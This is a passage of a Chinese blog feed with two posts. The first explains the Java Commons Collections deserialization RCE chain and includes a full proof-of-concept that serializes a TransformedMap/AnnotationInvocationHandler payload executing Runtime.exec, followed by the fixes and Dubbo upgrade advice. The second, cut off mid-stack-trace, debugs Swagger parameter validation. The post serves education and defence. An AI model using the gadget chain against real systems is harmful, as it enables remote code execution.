&lt;/ul&gt;&lt;p&gt;下面将会主要介绍 &lt;code&gt;TransformedMap&lt;/code&gt;触发方式，&lt;code&gt;LazyMap&lt;/code&gt;触发方式比较类似，感兴趣的同学可以研究这个开源库&lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;@ysoserial&lt;/a&gt; &lt;code&gt;CommonsCollections1&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote readability=&quot;1.5384615384615&quot;&gt;
&lt;p&gt;Github 地址：&lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;https://github.com/frohoff/ysoserial&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;TransformedMap&lt;/code&gt; 可以用来对 Map 进行某种变换，底层原理实际上是使用传入的 &lt;code&gt;Transformer&lt;/code&gt; 进行转换。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Transformer transformer = new ConstantTransformer(&quot;程序通事&quot;);

Map&amp;lt;String, String&amp;gt; testMap = new HashMap&amp;lt;&amp;gt;();
testMap.put(&quot;a&quot;, &quot;A&quot;);
// 只对 value 进行转换
Map decorate = TransformedMap.decorate(testMap, null, transformer);
// put 方法将会触发调用 Transformer 内部方法
decorate.put(&quot;b&quot;, &quot;B&quot;);

for (Object entry : decorate.entrySet()) {
    Map.Entry temp = (Map.Entry) entry;
    if (temp.getKey().equals(&quot;a&quot;)) {
        // Map.Entry setValue 也会触发 Transformer 内部方法
        temp.setValue(&quot;AAA&quot;);
    }
}
System.out.println(decorate);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果为：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;{b=程序通事, a=程序通事}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;annotationinvocationhandler&quot;&gt;AnnotationInvocationHandler&lt;/h3&gt;
&lt;p&gt;上文中我们知道了，只要调用 &lt;code&gt;TransformedMap&lt;/code&gt;的 &lt;code&gt;put&lt;/code&gt; 方法，或者调用 &lt;code&gt;Map.Entry&lt;/code&gt;的 &lt;code&gt;setValue&lt;/code&gt;方法就可以触发我们设置的 &lt;code&gt;ChainedTransformer&lt;/code&gt;，从而触发 &lt;code&gt;Runtime&lt;/code&gt; 执行外部命令。&lt;/p&gt;
&lt;p&gt;现在我们就需要找到一个可序列化的类，这个类&lt;strong&gt;正好&lt;/strong&gt;实现了 &lt;code&gt;readObject&lt;/code&gt;，且&lt;strong&gt;正好&lt;/strong&gt;可以调用 Map &lt;code&gt;put&lt;/code&gt; 的方法或者调用 &lt;code&gt;Map.Entry&lt;/code&gt;的 &lt;code&gt;setValue&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;Java 中有一个类 &lt;code&gt;sun.reflect.annotation.AnnotationInvocationHandler&lt;/code&gt;，正好满足上述的条件。这个类构造函数可以设置一个 &lt;code&gt;Map&lt;/code&gt; 变量，这下刚好可以把上面的 &lt;code&gt;TransformedMap&lt;/code&gt; 设置进去。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081031471-734444648.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;不过不要高兴的太早，这个类没有 public 修饰符，默认只有同一个包才可以使用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081031757-1704857760.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;不过这点难度，跟上面一比，还真是轻松，我们可以通过反射获取从而获取这个类的实例。&lt;/p&gt;
&lt;p&gt;示例代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
// 随便使用一个注解
Object instance = ctor.newInstance(Target.class, exMap);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;完整的序列化漏洞示例代码如下 ：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;String[] execArgs = new String[]{&quot;open -a Calculator&quot;};

final Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(
                &quot;getMethod&quot;,
                new Class[]{String.class, Class[].class},
                new Object[]{&quot;getRuntime&quot;, new Class[0]}
        ),
        new InvokerTransformer(
                &quot;invoke&quot;,
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}
        ),
        new InvokerTransformer(
                &quot;exec&quot;,
                new Class[]{String.class}, execArgs),
};
//
Transformer transformerChain = new ChainedTransformer(transformers);

Map&amp;lt;String, String&amp;gt; tempMap = new HashMap&amp;lt;&amp;gt;();
// tempMap 不能为空
tempMap.put(&quot;value&quot;, &quot;you&quot;);

Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);



Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
ctor.setAccessible(true);
// 随便使用一个注解
Object instance = ctor.newInstance(Target.class, exMap);


File f = new File(&quot;test.payload&quot;);
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(f));
oos.writeObject(instance);
oos.flush();
oos.close();

ObjectInputStream ois = new ObjectInputStream(new FileInputStream(f));
// 触发代码执行
Object newObj = ois.readObject();
ois.close();
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面代码中需要注意，&lt;code&gt;tempMap&lt;/code&gt;需要一定不能为空，且 &lt;code&gt;key&lt;/code&gt; 一定要是 &lt;strong&gt;value&lt;/strong&gt;。那可能有的同学为什么一定要这样设置？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;tempMap&lt;/code&gt;不能为空的原因是因为 &lt;code&gt;readObject&lt;/code&gt; 方法内需要遍历内部 &lt;code&gt;Map.Entry&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;s&gt;至于第二个问题，别问，问就是玄学&lt;/s&gt;~好吧，我也没研究清楚--，有了解的小伙伴的&lt;strong&gt;留言一下&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;最后总结一下这个反序列化漏洞代码执行链路如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081031922-106034409.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;common-collections-漏洞修复方式&quot;&gt;Common-Collections 漏洞修复方式&lt;/h2&gt;
&lt;p&gt;在 JDK 8 中，&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt; 移除了 &lt;code&gt;memberValue.setValue&lt;/code&gt;的调用，从而使我们上面构造的 &lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;+&lt;code&gt;TransformedMap&lt;/code&gt;失效。&lt;/p&gt;
&lt;p&gt;另外 &lt;code&gt;Common-Collections&lt;/code&gt;3.2.2 版本，对这些不安全的 Java 类序列化支持增加了开关，默认为关闭状态。&lt;/p&gt;
&lt;p&gt;比如在 &lt;code&gt;InvokerTransformer&lt;/code&gt;类中重写 &lt;code&gt;readObject&lt;/code&gt;，增相关判断。如果没有开启不安全的类的序列化则会抛出UnsupportedOperationException异常&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081032076-2045826391.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;dubbo-反序列化漏洞&quot;&gt;Dubbo 反序列化漏洞&lt;/h2&gt;
&lt;p&gt;Dubbo 反序列化漏洞原理与上面的类似，但是执行的代码攻击链与上面完全不一样，这里就不再复现的详细的实现的方式，感兴趣的可以看下面两篇文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/caiqiiqi/article/details/106934770&quot;&gt;https://blog.csdn.net/caiqiiqi/article/details/106934770&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html&quot;&gt;https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Dubbo 在 2020-06-22 日发布 2.7.7 版本，升级内容名其中包括了这个反序列化漏洞的修复。不过从其他人发布的文章来看，2.7.7 版本的修复方式，只是初步改善了问题，不过并没有根本上解决的这个问题。&lt;/p&gt;
&lt;p&gt;感兴趣的同学可以看下这篇文章：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/mob/vuls/241975.html&quot;&gt;https://www.freebuf.com/mob/vuls/241975.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;防护措施&quot;&gt;防护措施&lt;/h2&gt;
&lt;p&gt;最后作为一名普通的开发者来说，我们自己来修复这种漏洞，实在不太现实。&lt;/p&gt;
&lt;p&gt;术业有专攻，这种专业的事，我们就交给个高的人来顶。&lt;/p&gt;
&lt;p&gt;我们需要做的事，就是了解的这些漏洞的一些基本原理，树立的一定意识。&lt;/p&gt;
&lt;p&gt;其次我们需要了解一些基本的防护措施，做到一些基本的防御。&lt;/p&gt;
&lt;p&gt;如果碰到这类问题，我们及时需要关注官方的新的修复版本，尽早升级，比如 &lt;code&gt;Common-Collections&lt;/code&gt; 版本升级。&lt;/p&gt;
&lt;p&gt;有些依赖 jar 包，升级还是方便，但是有些东西升级就比较麻烦了。就比如这次 Dubbo 来说，官方目前只放出的 Dubbo 2.7 版本的修复版本，如果我们需要升级，需要将版本直接升级到 Dubbo 2.7.7。&lt;/p&gt;
&lt;p&gt;如果你目前已经在使用 Dubbo 2.7 版本，那么升级还是比较简单。但是如果还在使用 Dubbo 2.6 以下版本的，那么就麻烦了，没办法直接升级。&lt;/p&gt;
&lt;p&gt;Dubbo 2.6 到 Dubbo 2.7 版本，其中升级太多了东西，就比如包名变更，影响真的比较大。&lt;/p&gt;
&lt;p&gt;就拿我们系统来讲，我们目前这套系统，生产还在使用 JDK7。如果需要升级，我们首先需要升级 JDK。&lt;/p&gt;
&lt;p&gt;其次，我们目前大部分应用还在使用 &lt;strong&gt;Dubbo 2.5.6&lt;/strong&gt; 版本，这是真的，版本就是这么低。&lt;/p&gt;
&lt;p&gt;这部分应用直接升级到 Dubbo 2.7 ,改动其实非常大。另外有些基础服务，自从第一次部署之后，就再也没有重新部署过。对于这类应用还需要仔细评估。&lt;/p&gt;
&lt;p&gt;最后，我们有些应用，自己实现了 Dubbo SPI，由于 Dubbo 2.7 版本的包路径改动，这些 Dubbo SPI 相关包路径也需要做出一些改动。&lt;/p&gt;
&lt;p&gt;所以直接升级到 Dubbo 2.7 版本的，对于一些老系统来讲，还真是一件比较麻烦的事。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果真的需要升级，不建议一次性全部升级，建议采用逐步升级替换的方式，慢慢将整个系统的内 Dubbo 版本的升级。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;所以这种情况下，短时间内防御措施，可参考玄武实验室给出的方案：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081032437-772851212.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果当前 Dubbo 部署云上，那其实比较简单，可以使用云厂商的提供的相关流量监控产品，提前一步阻止漏洞的利用。&lt;/p&gt;
&lt;h2 id=&quot;最后（来个一键四连！！！）&quot;&gt;最后（来个一键四连！！！）&lt;/h2&gt;
&lt;p&gt;本人不是从事安全开发，上文中相关总结都是查询网上资料，然后加以自己的理解。如果有任何错误，麻烦各位大佬轻喷~&lt;/p&gt;
&lt;p&gt;如果可以的话，留言指出，谢谢了~&lt;/p&gt;
&lt;p&gt;好了，说完了正事，来说说这周的趣事~&lt;/p&gt;
&lt;p&gt;这周搬到了小黑屋，哼次哼次进入开发~&lt;/p&gt;
&lt;p&gt;刚进到小黑屋的时候，我发现里面的桌子，可以单独拆开。于是我就单独拆除一个桌子，然后霸占了一个背靠窗，正面直对大门的&lt;em&gt;天然划水摸鱼&lt;/em&gt;的好位置。&lt;/p&gt;
&lt;p&gt;之后我又叫来另外一个同事，坐在我的边上。当我们的把电脑，显示器啥的都搬过来放到桌子上之后。外面进来的同事就说这个会议室怎么就变成了跟房产线下门店一样了~&lt;/p&gt;
&lt;p&gt;还真别说，在我的位置前面摆上两把椅子，就跟上面的图一样了~&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081032648-467151196.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;好了，下周有点不知道些什么，大家有啥想了解，感兴趣的，可以留言一下~&lt;/p&gt;
&lt;p&gt;如果没有写作主题的话，咱就干回老本行，来聊聊这段时间，我在开发的聚合支付模式，尽请期待哈~&lt;/p&gt;
&lt;h2 id=&quot;帮助资料&quot;&gt;帮助资料&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;&lt;a href=&quot;http://blog.nsfocus.net/deserialization/&quot;&gt;http://blog.nsfocus.net/deserialization/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.beesfun.com/2017/05/07/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/&quot;&gt;http://www.beesfun.com/2017/05/07/JAVA反序列化漏洞知识点整理/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2041&quot;&gt;https://xz.aliyun.com/t/2041&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2028&quot;&gt;https://xz.aliyun.com/t/2028&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/vuls/241975.html&quot;&gt;https://www.freebuf.com/vuls/241975.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://rui0.cn/archives/1338&quot;&gt;http://rui0.cn/archives/1338&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://apachecommonstipsandtricks.blogspot.com/2009/01/transformedmap-and-transformers-plug-in.html&quot;&gt;http://apachecommonstipsandtricks.blogspot.com/2009/01/transformedmap-and-transformers-plug-in.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/97&quot;&gt;https://security.tencent.com/index.php/blog/msg/97&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://wooyun.js.org/drops/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%8C%E6%95%B4%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95.html&quot;&gt;JAVA反序列化漏洞完整过程分析与调试&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://security.tencent.com/index.php/blog/msg/131&quot;&gt;https://security.tencent.com/index.php/blog/msg/131&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/1264/#35&quot;&gt;https://paper.seebug.org/1264/#35&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;blockquote readability=&quot;5.5384615384615&quot;&gt;
&lt;p&gt;欢迎关注我的公众号：程序通事，获得日常干货推送。如果您对我的专题内容感兴趣，也可以关注我的博客：&lt;a href=&quot;https://studyidea.cn&quot;&gt;studyidea.cn&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Thu, 09 Jul 2020 00:11:00 +0000</pubDate>
<dc:creator>楼下小黑哥</dc:creator>
<og:description>前言 这周收到外部合作同事推送的一篇文章，【漏洞通告】Apache Dubbo Provider默认反序列化远程代码执行漏洞（CVE-2020-1948）通告。 按照文章披露的漏洞影响范围，可以说是当</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/goodAndyxublog/p/13270411.html</dc:identifier>
</item>
<item>
<title>源码剖析@ApiImplicitParam对@RequestParam的required属性的侵入性 - 清茶豆奶</title>
<link>http://www.cnblogs.com/huangying2124/p/13270358.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/huangying2124/p/13270358.html</guid>
<description>&lt;h3 id=&quot;问题起源&quot;&gt;问题起源&lt;/h3&gt;
&lt;p&gt;使用SpringCloud构建项目时，使用Swagger生成相应的接口文档是推荐的选项，Swagger能够提供页面访问，直接在网页上调试后端系统的接口， 非常方便。最近却遇到了一个有点困惑的问题，演示接口示例如下（原有功能接口带有业务实现逻辑，这里简化了接口）：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * @description: 演示类
 * @author: Huang Ying
 **/
@Api(tags = &quot;演示类&quot;)
@RestController
@Slf4j
public class DemoController {

        @ApiOperation(value = &quot;测试接口&quot;)
        @ApiImplicitParams({
                        @ApiImplicitParam(name = &quot;uid&quot;, value = &quot;用户ID&quot;, paramType = &quot;query&quot;, dataType = &quot;Long&quot;)
        })
        @RequestMapping(value = &quot;/api/json/demo&quot;, method = RequestMethod.GET)
        public String auth(@RequestParam(value = &quot;uid&quot;) Long uid) {
                System.out.println(uid);
                return &quot;the uid: &quot; + uid;
        }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;问题出在接口参数uid的必填性上，&lt;code&gt;@RequestParam&lt;/code&gt;注解里require默认为true，要求必填，但&lt;code&gt;@ApiImplicitParam&lt;/code&gt;注解里require默认为false，要求非必填，该业务接口在进行功能联调时，uid居然能得到一个null值，按照一般认知习惯&lt;code&gt;@ApiImplicitParam&lt;/code&gt;注解的主要作用是生成接口文档，不应该对&lt;code&gt;@RequestParam&lt;/code&gt;的属性有侵入性才对，目前反馈的bug，让我怀疑&lt;code&gt;@ApiImplicitParam&lt;/code&gt;是不是会侵入&lt;code&gt;@RequestParam&lt;/code&gt;的require属性？&lt;/p&gt;
&lt;h3 id=&quot;框架选型、版本及主要功能&quot;&gt;框架选型、版本及主要功能&lt;/h3&gt;
&lt;h4 id=&quot;项目搭建&quot;&gt;项目搭建&lt;/h4&gt;
&lt;p&gt;SpringBoot版本：2.1.6.RELEASE&lt;br/&gt;SpringCloud版本：Greenwich.SR3&lt;/p&gt;
&lt;h5 id=&quot;业务模块&quot;&gt;业务模块&lt;/h5&gt;
&lt;p&gt;SpringCloud业务模块使用的swagger:&lt;/p&gt;
&lt;p&gt;swagger bootstrap ui 1.9.6 增强swagger ui样式&lt;br/&gt;spring4all-swagger 1.9.0.RELEASE 配置化swagger参数，免去代码开发&lt;/p&gt;
&lt;h5 id=&quot;业务网关&quot;&gt;业务网关&lt;/h5&gt;
&lt;p&gt;SpringCloud业务网关使用的swagger:&lt;/p&gt;
&lt;p&gt;knife4j 2.0.1 增强swagger ui样式（网关用gateway搭建，swagger使用knife4j-spring-boot-starter依赖，可以聚合业务模块的swagger文档）&lt;/p&gt;
&lt;p&gt;此次的范围只针对SpringCloud业务模块，暂时不涉及业务网关的Swagger文档。&lt;/p&gt;
&lt;h4 id=&quot;测试工具&quot;&gt;测试工具&lt;/h4&gt;
&lt;p&gt;测试工具目前有两个：&lt;br/&gt;swagger doc：使用浏览器进行访问，如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr.cn-bj.ufileos.com/b1f1b5a0-e33b-4fb0-8883-326fc64433d6.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;postman：手动配置接口参数，示例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr.cn-bj.ufileos.com/efd8f838-dfd1-41a6-8e03-3c4278dcb22d.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;案例实战&quot;&gt;案例实战&lt;/h3&gt;
&lt;h4 id=&quot;接口测试1&quot;&gt;接口测试1&lt;/h4&gt;
&lt;p&gt;接口示例如开篇所示，我们先使用如下接口，全部使用默认值，即@ApiImplicitParam的required为false，@RequestParam的required为true：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@ApiOperation(value = &quot;测试接口&quot;)
@ApiImplicitParams({
                @ApiImplicitParam(name = &quot;uid&quot;, value = &quot;用户ID&quot;, paramType = &quot;query&quot;, dataType = &quot;Long&quot;)
})
@RequestMapping(value = &quot;/api/json/demo&quot;, method = RequestMethod.GET)
public String auth(@RequestParam(value = &quot;uid&quot;) Long uid) {
        System.out.println(uid);
        return &quot;the uid: &quot; + uid;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;看swagger的结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr.cn-bj.ufileos.com/07147287-c18e-4474-843d-8580d49aaad8.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;看postman的结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr.cn-bj.ufileos.com/41e8ce68-cb7b-4ce1-9b1e-532a8f0c0b67.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;接口测试2&quot;&gt;接口测试2&lt;/h4&gt;
&lt;p&gt;我们修改@ApiImplicitParam的required值为true，@RequestParam不变，重启模块&lt;br/&gt;&lt;code&gt;@ApiImplicitParam(name = &quot;uid&quot;, value = &quot;用户ID&quot;, paramType = &quot;query&quot;, required = true, dataType = &quot;Long&quot;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;看swagger的结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr.cn-bj.ufileos.com/1b735eb5-741c-43ac-9df8-5ff6a81485d9.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过调试浏览器可以发现，为空校验是js完成的，js判断为空后，并未发起请求到后端，这样我们可以认为swagger内@ApiImplicitParam的required参数生效了。&lt;/p&gt;
&lt;h4 id=&quot;接口测试3&quot;&gt;接口测试3&lt;/h4&gt;
&lt;p&gt;在前面我们使用postman测试接口时，发现参数项是空的，我们加上参数，但不写值测试后，结果让人诧异：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr.cn-bj.ufileos.com/8d689212-a8ac-4eff-97a8-987be4b8e87a.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;并且无论@ApiImplicitParam的required值如何修改，结果都是一样的，肯定有一个地方是搞错了，导致我们误判。&lt;/p&gt;
&lt;p&gt;后来仔细查阅资料，发现是我们对@RequestParam的required参数理解错了，这个required为true的含义是：接口参数名一定要存在，但参数后面有没有值它管不着。拿刚刚的例子来说：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;这两个请求是通过的：
localhost:8080/api/json//demo?uid
localhost:8080/api/json//demo?uid=

只有这种请求是不通过的：
localhost:8080/api/json//demo?
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;小结论&quot;&gt;小结论&lt;/h4&gt;
&lt;p&gt;经过上述三个接口的测试场景，我们至少可以明确3点：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;@ApiImplicitParam的required参数不会对@RequestParam的required值造成侵入，它们俩不相关。&lt;/li&gt;
&lt;li&gt;@ApiImplicitParam的required参数会影响swagger doc的js逻辑判断，为空校验是在js层面上完成的。&lt;/li&gt;
&lt;li&gt;@RequestParam的required参数默认情况下只会校验是否有该参数名，不校验它是否有值。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;源码剖析&quot;&gt;源码剖析&lt;/h3&gt;
&lt;h4 id=&quot;swagger部分&quot;&gt;swagger部分&lt;/h4&gt;
&lt;p&gt;上一节当中提及swagger读取@ApiImplicitParam注解的required参数，最终会体现在js上，通过浏览器F12的追踪，定位到swaggerbootstrapui.js文件上，这里摘抄部分源码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;# 点击发送按钮时，逐行读取参数信息，并提取required参数
 paramBody.find(&quot;tr&quot;).each(function () {
    var paramtr=$(this);
    var cked=paramtr.find(&quot;td:first&quot;).find(&quot;:checked&quot;).prop(&quot;checked&quot;);
    var _urlAppendflag=true;
    //that.log(cked)
    if (cked){
        //如果选中，留意此行的required:paramtr.data(&quot;required&quot;)信息提取
        var trdata={name:paramtr.find(&quot;td:eq(2)&quot;).find(&quot;input&quot;).val(),in:paramtr.data(&quot;in&quot;),required:paramtr.data(&quot;required&quot;),type:paramtr.data(&quot;type&quot;),emflag:paramtr.data(&quot;emflag&quot;),schemavalue:paramtr.data(&quot;schemavalue&quot;)};
        //that.log(&quot;trdata....&quot;)
        //that.log(trdata);
        //获取key
        //var key=paramtr.find(&quot;td:eq(1)&quot;).find(&quot;input&quot;).val();
        var key=trdata[&quot;name&quot;];
        //获取value
        var value=&quot;&quot;;
        var reqflag=false;
        // 后面代码省略
    }
})
 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;js上判断该属性required是否为true的处理，js源码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;//判断是否required
if (trdata.hasOwnProperty(&quot;required&quot;)){
    var required=trdata[&quot;required&quot;];
    if (required){
        if(!reqflag){
            //必须,验证value是否为空
            if(value==null||value==&quot;&quot;){
                validateflag=true;
                var des=trdata[&quot;name&quot;]
                //validateobj={message:des+&quot;不能为空&quot;};
                validateobj={message:des+i18n.message.debug.fieldNotEmpty};
                return false;
            }
        }
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;springcloud业务模块部分&quot;&gt;SpringCloud业务模块部分&lt;/h4&gt;
&lt;p&gt;swagger前端js验证通过可以向后台发送请求，或者使用postman向后台系统发送请求时，开始进入后台的一系列过滤器、Servlet处理，东西还不少：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 实际的业务方法部分
auth:28, DemoController (com.hy.demo.controller)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)

// 请求参数的提取、控制部分
doInvoke:190, InvocableHandlerMethod (org.springframework.web.method.support)
invokeForRequest:138, InvocableHandlerMethod (org.springframework.web.method.support)
invokeAndHandle:104, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)
invokeHandlerMethod:892, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handleInternal:797, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)
handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)

// 下面是各种基础Web服务组件的过滤器等，暂时不关心
doDispatch:1039, DispatcherServlet (org.springframework.web.servlet)
doService:942, DispatcherServlet (org.springframework.web.servlet)
processRequest:1005, FrameworkServlet (org.springframework.web.servlet)
doGet:897, FrameworkServlet (org.springframework.web.servlet)
service:634, HttpServlet (javax.servlet.http)
service:882, FrameworkServlet (org.springframework.web.servlet)
service:741, HttpServlet (javax.servlet.http)
internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:53, WsFilter (org.apache.tomcat.websocket.server)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:84, SecurityBasicAuthFilter (com.github.xiaoymin.swaggerbootstrapui.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:53, ProductionSecurityFilter (com.github.xiaoymin.swaggerbootstrapui.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilter:124, WebStatFilter (com.alibaba.druid.support.http)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:88, HttpTraceFilter (org.springframework.boot.actuate.web.trace.servlet)
doFilter:109, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:99, RequestContextFilter (org.springframework.web.filter)
doFilter:109, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:92, FormContentFilter (org.springframework.web.filter)
doFilter:109, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
doFilterInternal:93, HiddenHttpMethodFilter (org.springframework.web.filter)
doFilter:109, OncePerRequestFilter (org.springframework.web.filter)
internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)
